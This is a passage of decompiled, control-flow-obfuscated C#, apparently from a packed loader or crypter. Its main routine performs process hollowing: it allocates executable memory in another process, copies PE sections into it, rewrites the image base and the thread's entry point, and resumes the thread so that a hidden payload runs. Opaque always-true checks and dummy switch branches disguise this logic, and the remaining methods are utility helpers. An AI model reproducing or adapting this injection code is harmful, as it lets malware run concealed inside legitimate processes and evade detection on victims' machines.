												CS_0024_003C_003E8__locals0.int_0 = delegate7(@class.struct0_0.intptr_0, 0, length, 12288, 64);
											}
											if (CS_0024_003C_003E8__locals0.int_0 != 0)
											{
												if (delegate3(@class.struct0_0.intptr_0, CS_0024_003C_003E8__locals0.int_0, array, CS_0024_003C_003E8__locals0.int_1, ref bytesRead))
												{
													int num4 = num + 248;
													short num5 = BitConverter.ToInt16(array, num + 6);
													int num6 = 0;
													while (true)
													{
														if (num6 <= num5 - 1)
														{
															num7 = BitConverter.ToInt32(array, num4 + 12);
															goto IL_029d;
														}
														byte[] bytes = BitConverter.GetBytes(CS_0024_003C_003E8__locals0.int_0);
														while (true)
														{
															if (delegate3(@class.struct0_0.intptr_0, num3 + 8, bytes, 4, ref bytesRead))
															{
																int num8 = BitConverter.ToInt32(array, num + 40);
																if (!v2IJBhvCyRSyXwG8iyi())
																{
																	break;
																}
																switch (12)
																{
																case 5:
																	break;
																case 11:
																	goto IL_02ab;
																default:
																	goto IL_02b9;
																case 8:
																case 14:
																	continue;
																case 0:
																case 4:
																	goto IL_03f8;
																case 10:
																	goto IL_0428;
																case 13:
																	goto end_IL_038c;
																case 1:
																	goto IL_047b;
																case 3:
																	goto IL_0481;
																case 7:
																	goto IL_0487;
																case 12:
																{
																	if (flag3)
																	{
																		CS_0024_003C_003E8__locals0.int_0 = num2;
																	}
																	array2[44] = CS_0024_003C_003E8__locals0.int_0 + num8;
																	if (unchecked((long)delegate5(@class.struct0_0.intptr_1, array2)) != 0L)
																	{
																		throw new Exception();
																	}
																	if (flag2)
																	{
																		new Thread((ThreadStart)delegate
																		{
																			Thread.CurrentThread.IsBackground = true;
																			Class20.Struct0 struct0_ = CS_0024_003C_003E8__locals0.class18_0.struct0_0;
																			uint uint_ = (uint)CS_0024_003C_003E8__locals0.int_0;
																			int int_ = CS_0024_003C_003E8__locals0.int_1;
																			Class58.smethod_73(uint_, int_, struct0_);
																		}).Start();
																		goto end_IL_0455;
																	}
																	uint SuspendCount = 0u;
																	if (delegate8(@class.struct0_0.intptr_1, out SuspendCount) == -1)
																	{
																		goto case 6;
																	}
																	thread = new Thread((ThreadStart)delegate
																	{
																		Class58.smethod_29((int)CS_0024_003C_003E8__locals0.class18_0.struct0_0.uint_0);
																	});
																	goto case 2;
																}
																case 6:
																	throw new Exception();
																case 2:
																	thread.IsBackground = true;
																	goto case 15;
																case 15:
																	thread.Start();
																	goto end_IL_0455;
																}
																goto IL_029d;
															}
															goto IL_0487;
															IL_0487:
															throw new Exception();
															continue;
															end_IL_038c:
															break;
														}
														break;
														IL_029d:
														num9 = BitConverter.ToInt32(array, num4 + 16);
														goto IL_02ab;
														IL_02b9:
														if (num9 != 0)
														{
															byte[] array3 = new byte[num9 - 1 + 1];
															Buffer.BlockCopy(array, srcOffset, array3, 0, array3.Length);
															if (!delegate3(@class.struct0_0.intptr_0, CS_0024_003C_003E8__locals0.int_0 + num7, array3, array3.Length, ref bytesRead))
															{
																throw new Exception();
															}
														}
														num4 += 40;
														num6++;
														continue;
														IL_02ab:
														srcOffset = BitConverter.ToInt32(array, num4 + 20);
														goto IL_02b9;
													}
													break;
												}
												throw new Exception();
											}
											throw new Exception();
										}
										break;
									}
									continue;
								}
								throw new Exception();
							}
							throw new Exception();
						}
						goto IL_047b;
					}
					goto IL_0481;
					IL_0481:
					throw new Exception();
					IL_047b:
					throw new Exception();
					continue;
					end_IL_0455:
					break;
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = false;
				ProjectData.ClearProjectError();
				goto IL_054a;
			}
			Thread.Sleep(100);
			return true;
		}
		IL_054a:
		return result;
	}

	static void smethod_162(Control0 control0_0)
	{
		Class58.smethod_3(control0_0, string.Empty);
	}

	static void smethod_163(Class31.Class37 class37_0)
	{
		class37_0.int_0 |= 12;
	}

	static void smethod_164()
	{
		try
		{
			Class58.smethod_169();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_165(Class31.Class40 class40_0)
	{
		Array.Copy(class40_0.byte_0, 32768, class40_0.byte_0, 0, 32768);
		int num2 = default(int);
		while (true)
		{
			class40_0.int_1 -= 32768;
			class40_0.int_4 -= 32768;
			class40_0.int_3 -= 32768;
			while (true)
			{
				IL_00d7:
				int num = 0;
				while (true)
				{
					if (num < 32768)
					{
						num2 = class40_0.short_0[num] & 0xFFFF;
						goto IL_0030;
					}
					while (true)
					{
						IL_00c6:
						int num3 = 0;
						while (true)
						{
							IL_00bc:
							if (num3 >= 32768)
							{
								return;
							}
							int num4 = class40_0.short_1[num3] & 0xFFFF;
							class40_0.short_1[num3] = (short)((num4 >= 32768) ? (num4 - 32768) : 0);
							num3++;
							int num5 = 6;
							if (!v2IJBhvCyRSyXwG8iyi())
							{
								break;
							}
							while (true)
							{
								switch (num5)
								{
								case 0:
								case 2:
									break;
								default:
									num5 = 0;
									if (!IwxRFxvB9dB3g1fRikX())
									{
									}
									continue;
								case 6:
									goto IL_00bc;
								case 5:
									goto IL_00c6;
								case 1:
								case 4:
									goto IL_00d7;
								case 3:
									goto end_IL_00bc;
								}
								break;
							}
							goto IL_0030;
							continue;
							end_IL_00bc:
							break;
						}
						break;
					}
					break;
					IL_0030:
					class40_0.short_0[num] = (short)((num2 >= 32768) ? (num2 - 32768) : 0);
					num++;
				}
				break;
			}
		}
	}

	static int smethod_166(Class31.Class38 class38_0, int int_0)
	{
		int num = 0;
		while (int_0 >= 4)
		{
			num += 2;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static void smethod_167(Class53 class53_0)
	{
		try
		{
			Graphics val = ((Control)class53_0).CreateGraphics();
			try
			{
				string text = ((Control)class53_0).get_Text();
				Font font = default(Font);
				if (v2IJBhvCyRSyXwG8iyi())
				{
					switch (3)
					{
					case 3:
						font = ((Control)class53_0).get_Font();
						break;
					case 0:
					case 1:
						break;
					default:
						goto IL_004a;
					case 5:
						goto IL_005a;
					}
				}
				int width = ((Control)class53_0).get_Width();
				goto IL_004a;
				IL_004a:
				int num = Class58.smethod_146(font, text, val, width);
				if (num <= 0)
				{
					return;
				}
				goto IL_005a;
				IL_005a:
				((Control)class53_0).set_Height(num);
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static Assembly[] smethod_168(Class45 class45_0)
	{
		try
		{
			return AppDomain.CurrentDomain.GetAssemblies();
		}
		catch
		{
			return new Assembly[1] { Class58.smethod_31() };
		}
	}

	static void smethod_169()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class58.smethod_75;
		}
		catch
		{
		}
	}

	internal static bool v2IJBhvCyRSyXwG8iyi()
	{
		return true;
	}

	internal static bool IwxRFxvB9dB3g1fRikX()
	{
		return false;
	}
}
